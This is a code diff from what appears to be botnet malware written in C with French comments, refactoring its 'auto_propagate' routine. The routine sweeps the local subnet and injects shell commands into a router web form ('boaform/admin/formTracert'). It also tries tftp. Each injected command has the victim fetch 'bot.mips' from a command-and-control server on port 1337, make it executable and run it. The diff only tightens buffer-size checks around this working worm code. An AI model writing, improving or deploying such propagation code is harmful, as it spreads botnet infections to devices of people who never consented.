@@ -179,39 +179,44 @@ void auto_propagate() {
     if (f && fgets(localnet, sizeof(localnet), f)) {
         localnet[strcspn(localnet, "\n")] = 0;
         char ip[64];
-        char cmd[CMD_SIZE];
-        char wget_payload[CMD_SIZE];
-        char curl_payload[CMD_SIZE];
+        char cmd[CMD_MAX_SIZE];
+        char base_payload[PAYLOAD_MAX_SIZE];
         
-        // Préparer les payloads une seule fois
-        snprintf(wget_payload, sizeof(wget_payload), 
-            "rm -rf /var/tmp/bot;wget http://%s:1337/bot.mips -O /var/tmp/bot;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
-            C2_SERVER);
-        
-        snprintf(curl_payload, sizeof(curl_payload),
-            "rm -rf /var/tmp/bot;curl -O http://%s:1337/bot.mips;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
+        // Préparer le payload de base
+        snprintf(base_payload, sizeof(base_payload), 
+            "rm -rf /var/tmp/bot;%%s http://%s:1337/bot.mips%%s/var/tmp/bot;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
             C2_SERVER);
         
         for (int i = 1; i < 255; i++) {
             snprintf(ip, sizeof(ip), "%s.%d", localnet, i);
             
+            // Préparer les commandes
+            char wget_cmd[PAYLOAD_MAX_SIZE];
+            char curl_cmd[PAYLOAD_MAX_SIZE];
+            
+            snprintf(wget_cmd, sizeof(wget_cmd), base_payload, "wget", " -O ");
+            snprintf(curl_cmd, sizeof(curl_cmd), base_payload, "curl -O", ";");
+            
             // Essayer wget
-            snprintf(cmd, sizeof(cmd),
+            if (snprintf(cmd, sizeof(cmd),
                 "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3B%s' > /dev/null 2>&1",
-                ip, wget_payload);
-            system(cmd);
+                ip, wget_cmd) < sizeof(cmd)) {
+                system(cmd);
+            }
             
             // Essayer curl
-            snprintf(cmd, sizeof(cmd),
+            if (snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST http://%s/boaform/admin/formTracert -d 'target_addr=%%3B%s' > /dev/null 2>&1",
-                ip, curl_payload);
-            system(cmd);
+                ip, curl_cmd) < sizeof(cmd)) {
+                system(cmd);
+            }
             
             // Essayer tftp
-            snprintf(cmd, sizeof(cmd),
+            if (snprintf(cmd, sizeof(cmd),
                 "tftp %s -c get bot.mips /var/tmp/bot; chmod 777 /var/tmp/bot; /var/tmp/bot mips > /dev/null 2>&1",
-                ip);
-            system(cmd);
+                ip) < sizeof(cmd)) {
+                system(cmd);
+            }
         }
     }
     if (f) pclose(f);
